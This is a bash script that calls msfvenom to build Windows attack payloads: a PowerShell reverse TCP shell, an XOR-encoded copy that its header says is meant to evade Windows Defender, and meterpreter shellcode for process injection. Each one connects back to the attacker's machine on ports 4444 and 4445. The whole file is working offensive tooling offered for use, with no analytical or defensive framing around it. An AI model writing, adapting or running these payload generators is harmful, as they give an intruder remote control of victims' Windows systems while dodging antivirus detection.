#!/bin/bash
# Generate PowerShell payloads for Windows Defender evasion

echo "=== Payload Generation Script ==="
echo "Generating PowerShell reverse shell payload..."

# Check if msfvenom is available
if ! command -v msfvenom &> /dev/null; then
    echo "ERROR: msfvenom not found. Please ensure Metasploit is installed."
    exit 1
fi

# Get attacker IP
ATTACKER_IP=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
PORT=4444

# Generate base PowerShell payload
echo "[*] Generating base PowerShell payload..."
msfvenom -p windows/x64/powershell_reverse_tcp \
    LHOST=$ATTACKER_IP \
    LPORT=$PORT \
    -f psh-reflection \
    -o base_payload.ps1 2>/dev/null

if [ $? -eq 0 ]; then
    echo "[+] Base payload generated: base_payload.ps1"
else
    echo "[-] Failed to generate base payload"
    exit 1
fi

# Generate encoded PowerShell payload
echo "[*] Generating encoded PowerShell payload..."
msfvenom -p windows/x64/powershell_reverse_tcp \
    LHOST=$ATTACKER_IP \
    LPORT=$PORT \
    -e x64/xor_dynamic \
    -f psh-reflection \
    -o encoded_payload.ps1 2>/dev/null

if [ $? -eq 0 ]; then
    echo "[+] Encoded payload generated: encoded_payload.ps1"
else
    echo "[-] Failed to generate encoded payload"
fi

# Generate raw shellcode for process injection
echo "[*] Generating raw shellcode for process injection..."
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=$ATTACKER_IP \
    LPORT=4445 \
    -f python \
    -v shellcode \
    -o shellcode.py 2>/dev/null

if [ $? -eq 0 ]; then
    echo "[+] Shellcode generated: shellcode.py"
else
    echo "[-] Failed to generate shellcode"
    exit 1
fi

echo ""
echo "=== Generation Complete ==="
echo "Attacker IP: $ATTACKER_IP"
echo "Listener Port (PS): $PORT"
echo "Listener Port (Shellcode): 4445"
echo ""
echo "Files generated:"
ls -la *.ps1 *.py 2>/dev/null | awk '{print "  " $9 " (" $5 " bytes)"}'
